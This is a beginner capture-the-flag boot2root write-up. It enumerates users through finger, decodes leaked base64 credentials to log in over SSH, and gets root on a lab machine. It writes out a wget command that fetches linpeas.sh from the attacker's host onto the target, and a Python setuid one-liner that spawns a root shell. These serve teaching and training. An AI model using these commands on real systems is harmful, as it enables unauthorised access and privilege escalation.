# Task 15 - Chess Industry

Category: Boot2Root
Difficulty: Beginner

# nmap

Starting out, we start an nmap-scan as usual when it is a boot2root machine. Since we want to know what ports are open and find what our possible ways into the machine might be.

![task15_1](https://github.com/user-attachments/assets/f2341a36-3e22-42b4-a3a2-215735bc75c5)


We find that there are 3 ports of interest to start off with. ssh, http and finger. Finger is something I've never encountered before, and we have no credentials for ssh. So the obvious choice to start out with is checking out what we can find on the http port.

# http

As we enter the site this is what we're greeted with.

![task15_2](https://github.com/user-attachments/assets/d4208b05-9f6d-472f-ad59-fb37c5f0d915)


There isn't really much of note at first glance. But to the keen eye we can actually gather some vital information. There are three names here. They might actually be used as usernames as well.

# finger

Since I didn't really have any knowledge about this since before. I tried looking up what it was used for and found this in the man-page of finger.

```
NAME
       finger — user information lookup program

SYNOPSIS
       finger [-lmsp] [user ...] [user@host ...]

DESCRIPTION
       The finger displays information about the system users.
```
So it can be used to lookup users. What if we try this with the names from the site?

```
finger magnus@10.10.107.122 && finger fabiano@10.10.107.122 && finger hikaru@10.10.107.122
```

![task15_3](https://github.com/user-attachments/assets/6399b960-74f5-4c0e-a5f9-b3828e003c90)


Interesting, in fabiano's output we find a string that looks encoded. We can paste it in on https://dencode.com/en/ and let it try to decode it.

There we find that it is encoded with base64 and it is something that looks like credentials in the form of "username:password"

Where can we use them? We have a service that we know is running on the server that we haven't explored yet. Namely SSH.

# ssh

![task15_4](https://github.com/user-attachments/assets/54605fa3-640e-48cf-98cb-44de34f490e6)


Success! We're in. Now if we list the contents of fabianos home directory we find the user-flag.

So now we have the user-flag. Now we have to try to get root and the root flag. How would we do this? Let's make it easy shall we and let linpeas enumerate the machine for us to try to find ways we can escalate privileges.

As usual the first thing to try is to see if we have anything we can run with sudo.

```
sudo -l
```
No luck, but always worth a shot.


```
cd /tmp
```

We change directory to tmp so we can download linpeas into that directory and not have to mess with the home directory. And since we already have linpeas on our local system as part of Kali we go into the directory containing the script on our local machine. There we'll host a simple http server and download the script from our local machine to the target.

```
#locally
cd /usr/share/peass/linpeas && python3 -m http.server -port 1338

#target
wget http://10.9.245.105:1338/linpeas.sh
```

Now that we have the script downloaded onto our target. We will let it enumerate vulnerabilities for privilege escalation and see if we can find a way to get root.

```
bash linpeas.sh
```

![task15_5](https://github.com/user-attachments/assets/7258c02d-e850-4643-8c0d-780d9b29d124)


Very nice! We find out that python3.10 has setuid capabilities. We should be able to leverage this. We just need to make python start something for us with root uid.

```
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![task15_6](https://github.com/user-attachments/assets/abdf5bf3-93a3-4911-9a90-ddd6417ee9d5)


Awesome now we can just read /root/root.txt and get our root-flag and we're done.

# final thoughts

I found this machine a good start to the CTF. It was extremely beginner friendly and straight forward. A good start to build confidence in the participants. Always nice to be able to get a challenge done.
